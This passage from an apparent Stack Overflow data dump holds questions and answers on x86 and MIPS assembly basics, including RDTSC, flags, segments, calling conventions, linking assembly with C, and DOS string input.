    unsigned long long int x;
    __asm__ volatile ("".byte 0x0f, 0x31"" : ""=A"" (x));
    return x;
}
</code></pre>

<p>The problem is that it returns always an <strong>increasing</strong> number (in every run). It's as if it is referring to the absolute time.</p>

<p>Am I using the functions incorrectly?</p>
","<p>As long as your thread stays on the same CPU core, the RDTSC instruction will keep returning an increasing number until it wraps around. For a 2GHz CPU, this happens after 292 years, so it is not a real issue. You probably won't see it happen. If you expect to live that long, make sure your computer reboots, say, every 50 years.</p>

<p>The problem with RDTSC is that you have no guarantee that it starts at the same point in time on all cores of an elderly multicore CPU and no guarantee that it starts at the same point in time time on all CPUs on an elderly multi-CPU board.<br>
Modern systems usually do not have such problems, but the problem can also be worked around on older systems by setting a thread's affinity so it only runs on one CPU. This is not good for application performance, so one should not generally do it, but for measuring ticks, it's just fine.</p>

<p>(Another ""problem"" is that many people use RDTSC for measuring time, which is <em>not</em> what it does, but you wrote that you want CPU cycles, so that is fine. If you <em>do</em> use RDTSC to measure time, you may have surprises when power saving or hyperboost or whatever the multitude of frequency-changing techniques are called kicks in. For actual time, the <code>clock_gettime</code> syscall is surprisingly good under Linux.)</p>

<p>I would just write <code>rdtsc</code> inside the <code>asm</code> statement, which works just fine for me and is more readable than some obscure hex code. Assuming it's the correct hex code (and since it neither crashes and returns an ever-increasing number, it seems so), your code is good.</p>

<p>If you want to measure the number of ticks a piece of code takes, you want a tick <strong>difference</strong>, you just need to subtract two values of the ever-increasing counter. Something like <code>uint64_t t0 = rdtsc(); ... uint64_t t1 = rdtsc() - t0;</code><br>
Note that for if very accurate measurements isolated from surrounding code are necessary, you need to serialize, that is stall the pipeline, prior to calling <code>rdtsc</code> (or use <code>rdtscp</code> which is only supported on newer processors). The one serializing instruction that can be used at every privilegue level is <code>cpuid</code>.</p>

<p><strong>In reply to the further question in the comment:</strong></p>

<p>The TSC starts at zero when you turn on the computer (and the BIOS resets all counters on all CPUs to the same value, though some BIOSes a few years ago did not do so reliably).</p>

<p>Thus, from your program's point of view, the counter started ""some unknown time in the past"", and it always increases with every clock tick the CPU sees. Therefore if you execute the instruction returning that counter now and any time later in a different process, it will return a greater value (unless the CPU was suspended or turned off in between). Different runs of the same program get bigger numbers, because the counter keeps growing. Always.</p>

<p>Now, <code>clock_gettime(CLOCK_PROCESS_CPUTIME_ID)</code> is a different matter. This is the CPU time that the OS has given to the process. It starts at zero when your process starts. A new process starts at zero, too. Thus, two processes running after each other will get very similar or identical numbers, not ever growing ones.</p>

<p><code>clock_gettime(CLOCK_MONOTONIC_RAW)</code> is closer to how RDTSC works (and on some older systems is implemented with it). It returns a value that ever increases. Nowadays, this is typically a HPET. However, this is really <strong>time</strong>, and not <strong>ticks</strong>. If your computer goes into low power state (e.g. running at 1/2 normal frequency), it will <em>still</em> advance at the same pace.</p>
","8602589"
"What do the brackets mean in x86 asm?","24786","","<p>Given the following code:</p>

<pre><code>L1     db    ""word"", 0

       mov   al, [L1]
       mov   eax, L1
</code></pre>

<p>What do the brackets ([L1]) represent? </p>
","<p><code>[L1]</code> means the memory contents at address L1. After running <code>mov al, [L1]</code> here, The <code>al</code> register will receive the byte at address L1 (the letter 'w').</p>
","2030378"
"How to convert a positive number to negative in assembly","24632","","<p>I want to convert a positive number to negative in assembly,
I need a code sample</p>

<p>The input is in hex sdword</p>

<p>Thanks</p>
","<p>Well, there are two ways to do this, best would be to load the number into a register, then use the <code>NEG</code> instruction as Hans mention, ie: <code>NEG EAX</code> would negate eax. The other way would be <code>XOR EAX,EAX SUB EAX,EDX</code> where edx contains the number you want to negate</p>
","4535162"
"What does the dollar sign ($) mean in x86 assembly when calculating string lengths like ""$ - label""?","24601","","<p>For example, if we were writing a simple hello world type program, the .data section might contain something like:</p>

<pre><code>section .data

msg     db      'Enter something: '
len     equ     $ - msg
</code></pre>

<p>What does the $ in this example represent, and why does <code>$ - msg</code> equal the length of the string?</p>
","<p>It means the address of ""here"". In here ""here"" is the byte after the end of the <code>msg</code> string. Any assembler documentation will describe this. Read the documentation.</p>
","10361247"
"How to read and write x86 flags registers directly?","24566","","<p>From what I've read, seems like there are 9 different flags. Is it possible to read/change them directly? I know I can know for example if the zero flag is set after doing a cmp/jmp instruction, but I'm asking if it's possible to do something like</p>

<pre><code>mov eax, flags
</code></pre>

<p>or something.</p>

<p>Also, for writing, is it possible to set them by hand?</p>
","<p>Some flags can be set or cleared directly with specific instructions:</p>

<ul>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLC.htm"" rel=""noreferrer"">CLC</a>, <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STC.htm"" rel=""noreferrer"">STC</a>, and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CMC.htm"" rel=""noreferrer"">CMC</a>: clear, set, and complement the carry flag</li>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLI.htm"" rel=""noreferrer"">CLI</a> and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STI.htm"" rel=""noreferrer"">STI</a>: clear and set the interrupt flag (which should be done atomically)</li>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLD.htm"" rel=""noreferrer"">CLD</a> and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STD.htm"" rel=""noreferrer"">STD</a>: clear and set the direction flag</li>
</ul>

<p>For reading and writing the sign, zero, auxiliary carry, parity, and carry flags, you can use <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/LAHF.htm"" rel=""noreferrer"">LAHF</a> to load the lower 8 bits (those 5 flags plus 3 indeterminate bits) into the AH register, and you can use <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SAHF.htm"" rel=""noreferrer"">SAHF</a> to store those values from AH back into the flags register.</p>

<p>You can also use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm"" rel=""noreferrer"">PUSHF</a> instruction to push the flags onto the stack, read and modify them on the stack, and then use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm"" rel=""noreferrer"">POPF</a> instruction to store them back into the flags register.</p>

<p>Note that you cannot set the VM and RF flags with POPF -- they retain their previous values.  Similarly, you can only change the I/O privilege level when executing at privilege level 0, and the interrupt flag can only be changed when executing at a privilege level at least as privileged as the I/O privilege level.</p>
","1419632"
"CONCEPT OF MOV AX,CS and MOV DS,AX","24542","","<p>can someone please explain the functions of the three instructions.....</p>

<pre><code>&gt;      ORG 1000H 
&gt;      MOV AX,CS
&gt;      MOV DS,AX
</code></pre>

<p>I know what is code , data , extra segments in theory.</p>

<p>But,</p>

<p>1.How they are implementing  in these program? </p>

<p>2.Why they move the entire segment into another?<strong>(MOV AX,CS;MOV DS,AX;</strong>)</p>

<p>(excuse me if question is absurd) what is the <strong>real concept of these 2 instructions...</strong></p>

<blockquote>
  <p>/* The below given Assembly program of
  8086 Works well.</p>
  
  <p>I can Understand the meaning of every
  instruction in this code,</p>
  
  <p>except the highlighted 3 instructions.
  */</p>
</blockquote>

<p>The code accepts the input till 0 is hit!</p>

<pre><code>Code:
    ASSUME CS:CODE        
    CODE SEGMENT 
    ORG 1000H
    MOV AX,CS
    MOV DS,AX
BACK:
   MOV AH,01H
   INT 21H
   CMP AL,'0'
   JZ LAST
   JMP BACK
LAST:
   MOV AX,4C00H
   INT 21H
   CODE ENDS

   END
</code></pre>
","<p>To really explain the concept, we have to back up to the basic idea of segments, and how the x86 uses them (in real mode).</p>

<p>The 8086 has 20-bit addressing, but only 16-bit registers. To generate 20-bit addresses, it combines a segment with an offset. The segment has to be in a segment register (CS, DS, ES, or SS). You then generate an offset (as an immediate value, or the contents of another register or two.</p>

<p>So, to generate an address, a 16-bit segment register is shifted left four bits, and then a 16-bit offset in some other register is added to that, and the combined total is actually used as the address. Most instructions have a default segment attached to them -- <code>push</code>, <code>pop</code> and anything relative to <code>bp</code> will use <code>ss</code>. Jumps and such use <code>cs</code>. Some of the string instructions <code>es</code> (e.g., <code>scans</code>) and some use use two segments -- for example, <code>movsd</code> copies data from <code>[ds:si]</code> to <code>[es:di]</code>. Most other instructions use <code>ds</code>. You can also use segment overrides to explicitly specify an address like <code>es:bx</code>.</p>

<p>In any case, before you can make any meaningful use of a segment register, you first have to load it with the (top 16 bits of) the address of the data you care about. A typical ""small model"" program will start with something like:</p>

<pre><code>mov ax, @Data
mov ds, ax
</code></pre>

<p>In tiny model, you use the same segment for the data and the code. To make sure it's referring to the correct segment, you want to get the 16 bits from CS and copy it to DS. As a number of others have mentioned, there's no instruction to move CS directly to DS. The question mentions one possibility; another common one is:</p>

<pre><code>push cs
pop ds
</code></pre>
","5364845"
"How Do You Make An Assembler?","24522","","<p>I'd like to make a simple x86 assembler. I'm wondering if there's any tutorials for making your own assembler. Or if there's a simple assembler that I could study.</p>

<p>Also, I wonder what tools are used in looking at and handling the binary/hex of programs.</p>
","<p>This is what you are looking for: </p>

<p><a href=""http://www.davidsalomon.name/assem.advertis/AssemAd.html"" rel=""nofollow noreferrer"">Assemblers And Loaders - By David Salomon. Published February, 1993</a> - Freely available (<a href=""http://www.davidsalomon.name/assem.advertis/asl.pdf"" rel=""nofollow noreferrer"">download here</a>)</p>

<p>Of course, you are going to need the following:</p>

<ol>
<li><a href=""http://www.intel.com/products/processor/manuals/"" rel=""nofollow noreferrer"">Intel® 64 and IA-32 Architectures Software Developer's Manuals</a></li>
<li><a href=""http://www.amd.com/us-en/Processors/DevelopWithAMD/0,,30_2252_739_7044,00.html"" rel=""nofollow noreferrer"">AMD-64 Architecture Programmers manual</a></li>
<li><a href=""http://www.iecc.com/linker/"" rel=""nofollow noreferrer"">Linkers and Loaders by John R. Levine (freely available)</a></li>
<li>ELF File Format Specifications : <a href=""http://www.sco.com/developers/gabi/latest/contents.html"" rel=""nofollow noreferrer"">System V ABI Update</a></li>
<li><a href=""http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx"" rel=""nofollow noreferrer"">Microsoft Portable Executable and Common Object File Format Specification</a></li>
</ol>

<p>You can always refer to implementations of Opensource Assemblers:</p>

<ol>
<li><a href=""http://www.nasm.us/"" rel=""nofollow noreferrer"">Netwide Assembler (NASM)</a></li>
<li><a href=""http://www.gnu.org/software/binutils/"" rel=""nofollow noreferrer"">Gnu Assembler (GAS)</a></li>
</ol>
","2479275"
"x86 Assembly: INC and DEC instruction and overflow flag","24238","","<p>In x86 assembly, the overflow flag is set when an <code>add</code> or <code>sub</code> operation on a signed integer overflows, and the carry flag is set when an operation on an unsigned integer overflows.</p>

<p>However, when it comes to the <code>inc</code> and <code>dec</code> instructions, the situation seems to be somewhat different.  According to this <a href=""http://www.c-jump.com/CIS77/ASM/Flags/lecture.html"" rel=""noreferrer"">website</a>, the <code>inc</code> instruction does not affect the carry flag at all.</p>

<p>But I can't find any information about how <code>inc</code> and <code>dec</code> affect the overflow flag, if at all.</p>

<p>Do <code>inc</code> or <code>dec</code> set the overflow flag when an integer overflow occurs?  And is this behavior the same for both signed and unsigned integers?</p>

<p>============================= <strong>EDIT</strong> =============================</p>

<p>Okay, so essentially the consensus here is that INC and DEC should behave the same as ADD and SUB, in terms of setting flags, with the exception of the carry flag.  This is also what it says in the Intel manual.</p>

<p>The problem is I can't actually reproduce this behavior in practice, when it comes to unsigned integers.</p>

<p>Consider the following assembly code (using GCC inline assembly to make it easier to print out results.)</p>

<pre><code>int8_t ovf = 0;

__asm__
(
    ""movb $-128, %%bh;""
    ""decb %%bh;""
    ""seto %b0;""
    : ""=g""(ovf)
    :
    : ""%bh""
);

printf(""Overflow flag: %d\n"", ovf);
</code></pre>

<p>Here we decrement a signed 8-bit value of -128.  Since -128 is the smallest possible value, an overflow is inevitable.  As expected, this prints out: <code>Overflow flag: 1</code></p>

<p>But when we do the same with an <em>unsigned</em> value, the behavior isn't as I expect:</p>

<pre><code>int8_t ovf = 0;

__asm__
(
    ""movb $255, %%bh;""
    ""incb %%bh;""
    ""seto %b0;""
    : ""=g""(ovf)
    :
    : ""%bh""
);

printf(""Overflow flag: %d\n"", ovf);
</code></pre>

<p>Here I increment an unsigned 8-bit value of 255.  Since 255 is the largest possible value, an overflow is inevitable.  However, this prints out: <code>Overflow flag: 0</code>.  </p>

<p>Huh?  Why didn't it set the overflow flag in this case?</p>
","<p>The overflow flag is set when an operation would cause a sign change. Your code is very close. I was able to set the OF flag with the following (VC++) code:</p>

<pre><code>char ovf = 0;

_asm {
    mov bh, 127
    inc bh
    seto ovf
}
cout &lt;&lt; ""ovf: "" &lt;&lt; int(ovf) &lt;&lt; endl;
</code></pre>

<p>When BH is incremented the MSB changes from a 0 to a 1, causing the OF to be set.</p>

<p>This also sets the OF:</p>

<pre><code>char ovf = 0;

_asm {
    mov bh, 128
    dec bh
    seto ovf
}
cout &lt;&lt; ""ovf: "" &lt;&lt; int(ovf) &lt;&lt; endl;
</code></pre>

<p>Keep in mind that the processor does not distinguish between signed and unsigned numbers. When you use 2's complement arithmetic, you can have one set of instructions that handle both. If you want to test for unsigned overflow, you need to use the carry flag. Since INC/DEC don't affect the carry flag, you need to use ADD/SUB for that case.</p>
","3926251"
"ENTER and LEAVE in Assembly?","24227","","<p>I was reading <em>The Art of Assembly Language</em> (Randall Hyde, <a href=""http://rads.stackoverflow.com/amzn/click/1593272073"" rel=""noreferrer"">link to Amazon</a>) and I tried out a console application in that book. It was a program that created a new console for itself using Win32 API functions. The program contains a procedure called <code>LENSTR</code>, which stores the length of string in the <code>EBP</code> register. The code for this function is as follows:</p>

<pre><code>LENSTR PROC
ENTER 0, 0
PUSH  EAX
;----------------------
CLD
MOV   EDI, DWORD PTR [EBP+08H]
MOV   EBX, EDI
MOV   ECX, 100 ; Limit the string length
XOR   AL, AL
REPNE SCASB ; Find the 0 character
SUB   EDI, EBX ; String length including 0
MOV   EBX, EDI

DEC   EBX
;----------------------
POP   EAX
LEAVE
RET   4
LENSTR ENDP
</code></pre>

<p>Could you explain the usage of the <code>enter</code> and <code>leave</code> commands here?</p>
","<p>This is the setup for the stack frame (activation record) for the function.  Internally it normally looks something like this:</p>

<pre><code>push( ebp );         // Save a copy of the old EBP value

mov( esp, ebp );     // Get ptr to base of activation record into EBP

sub( NumVars, esp ); // Allocate storage for local variables.
</code></pre>

<p>Then when the stack frame is to be destroyed again, you have to do something along the following lines:</p>

<pre><code>   mov( ebp, esp );    // Deallocate locals and clean up stack.

   pop( ebp );         // Restore pointer to caller's activation record.

   ret();              // Return to the caller.
</code></pre>

<p><a href=""http://webster.cs.ucr.edu/AoA/Windows/HTML/IntermediateProceduresa2.html"" rel=""noreferrer"">Here</a> is a better explanation of it using HLA.  Though it is well explained in the book you're reading, as I have that book too, and I've read the section explaining it.</p>
","5859100"
"To learn assembly - should I start with 32 bit or 64 bit?","24209","","<p>I'm really wanting to learn assembly. I'm pretty good at c/c++, but want a better understanding of what's going on at a lower level.</p>

<p>I realize that assembly related questions have been asked before, but I'm just looking for some direction that's particular to my situation:</p>

<p>I'm running windows 7, and am confused about how I should start working with assembly. Do I <strong>have</strong> to start with x64 because I'm running windows 7? Some people have said 'start with 32 bit first' - how do I go about doing this? What does my operating system have to do with my ability to write assembly for '32' or '64' bit. In fact, what does 'n bit' assembly mean, where n is a number??</p>

<hr>

<p>Edit:</p>

<p>Here are some links that have helped me get started with assembly; others who are just getting started may find them helpful. I'll keep updating this list as I continue on my assembly journey :)</p>

<p>Note: As I've been learning, I've decided to focus on programming with masm32. Therefore most of the below resources focus on that.</p>

<ul>
<li><a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a>  <a href=""https://stackoverflow.com/tags/x86/info"">tag wiki</a> (beginner guides, reference manuals, ABI documentation, and more.)</li>
<li><a href=""http://www.masm32.com"" rel=""nofollow noreferrer"">www.masm32.com</a></li>
<li><a href=""http://en.wikibooks.org/wiki/X86_Assembly"" rel=""nofollow noreferrer"">X86 Assembly WikiBook</a></li>
<li><a href=""http://en.wikibooks.org/wiki/X86_Disassembly"" rel=""nofollow noreferrer"">X86 Dissassembly WikiBook</a> (great for understanding some conventions, and the basics of how higher level code translates into assembly)</li>
<li><a href=""http://www.winasm.net/"" rel=""nofollow noreferrer"">WinAsm IDE</a> (plays nicely with masm32)</li>
<li><a href=""http://www.acm.uiuc.edu/sigwin/old/workshops/winasmtut.pdf"" rel=""nofollow noreferrer"">Intro: Assembly for Windows</a> (all code examples are for masm32)</li>
<li><a href=""http://www.ctyme.com/intr/int.htm"" rel=""nofollow noreferrer"">List of Interrupts</a></li>
<li><a href=""http://help-site.com/local/ASMTUT.TXT"" rel=""nofollow noreferrer"">Assembly Tutorial</a> (great for helping to understand core concepts)</li>
<li><a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#registers"" rel=""nofollow noreferrer"">x86 Assembly Guide</a></li>
<li><p><a href=""http://agner.org/optimize/"" rel=""nofollow noreferrer"">Agner Fog's Software optimization resources</a>, including some good stuff about calling conventions on different platforms (Windows vs. Linux/OS X), as well as a lot of examples of how to do specific things efficiently.  Not great for total beginners, but great for intermediate to advanced readers.</p>

<p>(He also has detailed performance info for each instruction for Intel and AMD CPUs, excellent for serious performance micro-optimization.  Some beginners might want to look at some of that to get started thinking about how CPUs work, and why you might do something one way instead of another.)</p></li>
</ul>
","<p>When people refer to <code>32-bit</code> and <code>64-bit</code> assembly, they're talking about which instruction set you'll use - they're also sometimes called <code>Ia32</code> and <code>x64</code> in the Intel case, which I presume you're asking about.  There is a lot more going on in the 64-bit case, so starting with 32-bit is probably good; you just need to make sure you're assembling your program with a 32-bit assembler into a 32-bit binary.  Windows will still know how to run it.</p>

<p>What I really recommend for getting started with assembly would be something with a simpler instruction set to get a handle on.  Go learn <a href=""http://www.eecs.harvard.edu/~ellard/Courses/cs50-asm.pdf"" rel=""noreferrer"">MIPS assembly</a> - the <a href=""http://pages.cs.wisc.edu/~larus/spim.html"" rel=""noreferrer""><code>spim</code></a> simulator is great and easy to use.  If you really want to dive straight into the Intel assembly world, write yourself a little C program that calls your assembly routines for you; doing all the setup and teardown for a 'real program' is a big mess, and you won't even be able to get started there.  So just write a C wrapper with <code>main()</code> in it, and compile and link that with the object files you get from writing your assembly code.</p>

<p>Please don't get in the habit of writing inline assembly in your C code - it's a code portability nightmare, and there's no reason for it.</p>

<p>You can download all of the <a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">Intel 64 and IA-32 Architectures Software Developer's Manuals</a> to get started.</p>
","2352068"
"Analyzing a crash in Windows: what does the error message tell us?","24182","","<p>A small utility of mine that I made for personal use (written in C++) crashed randomly yesterday (I've used it roughly 100+ hours with no issues so far) and while I don't normally do this, I was feeling a bit adventurous and wanted to try and learn more about the problem. I decided to go into the Event Viewer and see what Windows had logged about the crash:</p>

<pre><code>Faulting application StraightToM.exe, version 0.0.0.0, time stamp 0x4a873d19 
Faulting module name : StraightToM.exe, version 0.0.0.0, time stamp 0x4a873d19
Exception code : 0xc0000005
Fault offset : 0x0002d160,
Faulting process id: 0x17b4
Faulting application start time: time 0x01ca238d9e6b48b9.
</code></pre>

<p>My question is, what do each of these things mean, and how would I use these to debug my program? Here's what I know so far: exception code describes the error, and 0xc0000005 is a memory access violation (tried to access memory it didn't own). I'm specifically interested in knowing more about the following:</p>

<ol>
<li>What does the fault offset mean? Does that represent the location in the file where the error occured, or does it mean the assembly 'line' where the error occured? Knowing the fault offset, how would I use a program like OllyDbg to find the corresponding assembly code that caused the error? Or -- even better -- would it be possible to (easily) determine what line of code in the C++ source caused this error?</li>
<li>It's obvious that the time stamp corresponds to the 32-bit UNIX time at the time of the crash, but what does the 64-bit application start time mean? Why would it be 64-bits if the time stamp is 32?</li>
</ol>

<p>Note that I'm primarily a C++ programmer, so while I know something about assembly, my knowledge of it is very limited. Additionally, this really isn't a serious problem that needs fixing (and is also not easily reproduced, given the nature of the program), I'm just using this more as an excuse to learn more about what these error messages mean. Most of the information about these crash logs that I've found online are usually aimed at the end-user, so they haven't helped me (as the programmer) very much.</p>

<p>Thanks in advance</p>
","<p>The 64-bit time stamp is the time application's primary thread was created in 100-nanosecond intervals since January 1, 1601 (UTC) (this is known as <code>FILETIME</code>). The 32-bit timestamp is indeed in <code>time_t</code> format (it tells the time the module was created and is stored in the module's header).</p>

<p>I'd say 0x0002d160 is an offset from the module's load address (it seems too low for an absolute address). Fire up Visual Studio, start the debugger, take a look at the ""modules"" debug window. Your exe file should be listed there. Find the address where the module is loaded, add 0x0002d160 to that address and take a look at the disassembly at the resulting address. Visual Studio shows source code intermixed with the assembly, you should have no problem figuring out what source line caused the problem.</p>
","1319284"
"MIPS assembly language - temporary register vs saved registers","23942","","<p>So far I have been using registers $s0-$s9 and same way as registers $t0-$t9. I have been told and read countless forum posts and paragraphs here and on Google explaining the difference, but with no coding examples. I'm told I should see the difference it pertain to using procedures, but I have created a countless number of scenarios involving procedures in an effort to find the difference between saved registers vs temporary register but I have failed.  </p>

<p><strong>I would kill to see a relatively simple example where a $t0-9 register would not act the same as a $s0-9 register and, as a result, produce a different value?</strong></p>
","<p>There is no difference between the temporary and saved variables in how they work. The difference is in how they are used, or rather, how they ought to be used.</p>

<p>The MIPS calling convention specifies how the various registers are to be used -- the <code>$v</code> registers are for function returns, the <code>$a</code> registers are for function arguments, the <code>$t</code> variables are temporary <em>caller saved</em> registers, while the <code>$s</code> registers are <em>callee saved</em>.</p>

<p>The difference between callee and caller saved is as follows: when calling a function, the convention guarantees that the <code>$s</code> registers are the same after return whereas the convention does not guarantee this for the <code>$t</code> registers. Of course this means that if you wish to use the <code>$s</code> registers in a routine, you must save and restore their values. For instance, if function A uses registers <code>$t0</code> and <code>$s0</code> and then calls a function B, it must save the register <code>$t0</code> if it wants to use it after function B returns. Function B must save <code>$s0</code> before it can begin using it.</p>

<p>An example:</p>

<pre><code>main:

    li $s0 7
    li $t0 7

    jal myFunction

    #$s0 guaranteed to equal 7
    #$t0 value not guaranteed
</code></pre>

<p><a href=""http://courses.cs.washington.edu/courses/cse410/09sp/examples/MIPSCallingConventionsSummary.pdf"">This link</a> looks like some decent more in-depth information.</p>

<p>Of course, all of this is only a convention, and therefore it only works if you and the other programs respect the convention by saving and restoring <code>$s</code> registers so that they are not overwritten by a function call.</p>
","20112240"
"absolute value in MIPS","23907","","<p>Do you have any simple ways to make a value in a register in MIPS as an absolute value?</p>
","<p>Here is a pretty simple way to do it.</p>

<pre><code>#assume you want the absolute value of r1
        ori $2, $zero, $1      #copy r1 into r2
        slt $3, $1, $zero      #is value &lt; 0 ?
        beq $3, $zero, foobar  #if r1 is positive, skip next inst
        sub $2, $zero, $1      #r2 = 0 - r1
foobar:
#r2 now contains the absolute value of r1
</code></pre>
","2312628"
"Bubble sort on array on Assembly Language","23884","","<p>I need to Bubblesort an unorganized array with 7 integers from biggest to smallest so it would look like 9,6,5,4,3,2,1.<br>
I ran my code through the compiler and it says </p>

<p><img src=""https://i.stack.imgur.com/Tz0UM.png"" alt=""Compiler Error""></p>

<p>I can't understand what is the problem with this code:</p>

<pre><code>code segment
assume ds:code,cs:code
start:
 mov ax,code
 mov ds,ax    ;code start
ARR:   dw 1,2,4,3,6,5,9
 mov ch,0h
 mov cl,1h
 mov bh 7h
 jmp assign_nums
restart:
 mov ch,0h
 mov cl,1h
 dec bh
 jmp assign_nums
swap:
 mov ch,dl
 mov cl,dh
 jmp next
next:
 cmp bh,cl
 je restart
 add ch,1h
 add cl,1h
 jmp assign_nums
assign_nums:
 cmp bh,0h
 je done
 mov dh,[ARR+ch]
 mov dl,[ARR+cl]
 cmp dh,dl
 jl swap
 jnl next
done:
 nop
code ends
end start
</code></pre>
","<p>For the 1st error you forgot to type a comma between the register and the immediate. </p>

<p>For the 2nd and 3rd errors the CH and CL registers cannot be used for addressing memory. Use SI, DI, or BX instead.</p>

<p>Since your array is defined as words you must treat it as such!<br>
Change </p>

<pre><code>mov dh,[ARR+ch]
mov dl,[ARR+cl]
</code></pre>

<p>into something like (depends on other choices you make)</p>

<pre><code>mov ax,[ARR+si]
mov dx,[ARR+di]
</code></pre>

<p>Please note that you placed the array amidst the instructions. This will crash your program as soon as you manage to compile it. Either place the array in a separate data segment of your program or jump over this line.</p>

<pre><code>start:
 mov ax,code
 mov ds,ax
 jmp start2
ARR:   dw 1,2,4,3,6,5,9
start2:
 mov ch,0h
</code></pre>
","30427483"
"How do I compile assembly routines for use with a C program (GNU assembler)?","23832","","<p>I have a set of assembly function which I want to use in C programs by creating a header file. For instance, if I have asm_functions.s which defines the actual assembly routines and asm_functions.h which has prototypes for the functions as well as some standard #define's I needed. My goal is to use a C program, say test_asm.c to call the assembly functions.</p>

<p>asm__functions.h:
<pre><code>
 #define ASM_CONST_1    0x80
 #define ASM_CONST_2    0xaf</p>

<p>uint8_t asm_foo( int, int, int );
</pre></code></p>

<p>asm__functions.s:
<pre><code>
 /* dont need this: #include ""asm_functions.h"" */</p>

<p>.section .text
 .type asm_foo, @function
 asm__foo:
   /* asm code with proper stack manipulation for C calling conventions */
   ret
</pre></code></p>

<p>test__asm.c:
<pre><code>
 #include ""asm_foo.h""</p>

<p>int main() {
      uint8_t res = asm_foo( 1, 2, 3);
      return 0;
 }
</pre></code></p>

<p>In a situation like this what would be the proper way to compile a link the program? I was trying something like this:</p>

<p><pre><code>
gas -o asm_foo.o asm_foo.s
gcc -o test_asm test_asm.c
</pre></code></p>

<p>But I still get a linker error from GCC saying that my assembly routine is undefined. I hope this contrived example is good enough to explain the situation.</p>

<p>Thanks!</p>

<p>EDIT:</p>

<p>Here is a snippet of output when I compile with a single command:
<pre><code>
tja@tja-desktop:~/RIT/SP2/latest$ gcc -o test_pci pci_config.s test_pci.c
/tmp/ccY0SmMN.o: In function <code>_pci_bios_read_byte':
(.text+0x8): undefined reference to</code>PCI_FUNCTION_ID'
/tmp/ccY0SmMN.o: In function <code>_pci_bios_read_byte':
(.text+0xa): undefined reference to</code>READ_CONFIG_BYTE'
/tmp/ccY0SmMN.o: In function <code>_pci_bios_read_byte':
(.text+0x18): undefined reference to</code>PCI_BIOS_FUNCTION_INT'
/tmp/ccY0SmMN.o: In function <code>_pci_bios_read_byte':
(.text+0x1b): undefined reference to</code>BAD_REGISTER_NUMBER'
/tmp/ccY0SmMN.o: In function <code>_pci_bios_read_word':
(.text+0x30): undefined reference to</code>PCI_FUNCTION_ID'
...
</pre></code></p>

<p>All of those, such as PCI_FUNCTION_ID, are defined in my header file, which is included by the C program. When I compile the assembly code by itself there are no errors.</p>
","<p>Based on the files in your question, I managed to compile it. I've changed both the file names and the file contents.</p>

<p>asm_const.h :</p>

<pre><code>#define ASM_CONST_1    0x80
#define ASM_CONST_2    0xaf
</code></pre>

<p>asm_functions.h :</p>

<pre><code>#include ""asm_const.h""
unsigned char asm_foo( int, int, int );
</code></pre>

<p>asm_functions.S (the trailing S must be capital! #include needs it) :</p>

<pre><code>#include ""asm_const.h""
.section .text
.globl asm_foo
.type asm_foo, @function
asm_foo:
  mov $ASM_CONST_1, %eax
  /* asm code with proper stack manipulation for C calling conventions */
  ret
</code></pre>

<p>test_asm.c :</p>

<pre><code>#include ""asm_functions.h""
int main() {
  return asm_foo( 1, 2, 3);
}
</code></pre>

<p>Please note that you need the the assembly file extension .S with capital S. With .s, the .s file wouldn't be run through the preprocessor, thus #include wouldn't work, and you wouldn't be able to use ASM_CONST_1 in the .s file.</p>

<p>Compile with a single command:</p>

<pre><code>gcc -o test_asm asm_functions.S test_asm.c
</code></pre>

<p>Or, as an alternative, compile with multiple commands, creating .o files:</p>

<pre><code>gcc -c asm_functions.S
gcc -c test_asm.c
gcc -o test_asm asm_functions.o test_asm.o
</code></pre>

<p>The single-command gcc takes care of compiling the .S file using gas, the .c file with GCC's C compiler, and linking the resulting temporary .o files together using ld. gcc runs all those commands with the appropriate flags by default.</p>

<p>On some systems (but not on Linux with the default GCC installation) you have to prepend an underscore to the names of exported functions in the .S file (but not in the .c or .h files). So all instances of <code>asm_foo</code> would become <code>_asm_foo</code> only in the .S file.</p>
","808967"
"How to make string input in Assembly language?","23824","","<p>Please, does anybody know how to code string input in assembly language? I'm using <code>int 21</code> to display and input characters.</p>
","<p>You can use <a href=""http://spike.scu.edu.au/~barry/interrupts.html#ah0a"">function <code>0Ah</code></a> to read buffered input. Given a string buffer in <code>ds:dx</code> it reads a string of up to length 255. The buffer layout is:</p>

<pre><code>Byte 0 String length (0-255)
Byte 1 Bytes read (0-255, filled by DOS on return)
Bytes 2-..Length+2 (The character string including newline as read by DOS).
</code></pre>

<p>An example of a small COM file that reads a string and then echos it back to the user:</p>

<pre><code>    org 0x100

start:
    push cs
    pop ds ; COM file, ds = cs

    mov ah, 0x0A ; Function 0Ah Buffered input
    mov dx, string_buf ; ds:dx points to string buffer
    int 0x21

    movzx si, byte [string_buf+1] ; get number of chars read

    mov dx, string_buf + 2 ; start of actual string

    add si, dx ; si points to string + number of chars read
    mov byte [si], '$' ; Terminate string

    mov ah, 0x09 ; Function 09h Print character string
    int 0x21 ; ds:dx points to string

    ; Exit
    mov ax, 0x4c00
    int 0x21

string_buf: 
    db 255 ; size of buffer in characters
    db 0 ; filled by DOS with actual size
    times 255 db 0 ; actual string
</code></pre>

<p>Note that it will overwrite the input line (and it thus might not look the program is doing anything!)</p>

<p>Alternatively you can use <a href=""http://spike.scu.edu.au/~barry/interrupts.html#ah01"">function <code>01h</code></a> and read the characters yourself in a loop. Something like this (note it will overflow later buffers if more than 255 characters are entered):</p>

<pre><code>    org 0x100

start:
    push cs
    pop ax
    mov ds, ax
    mov es, ax; make sure ds = es = cs

    mov di, string ; es:di points to string
    cld ; clear direction flag (so stosb incremements rather than decrements)
read_loop:
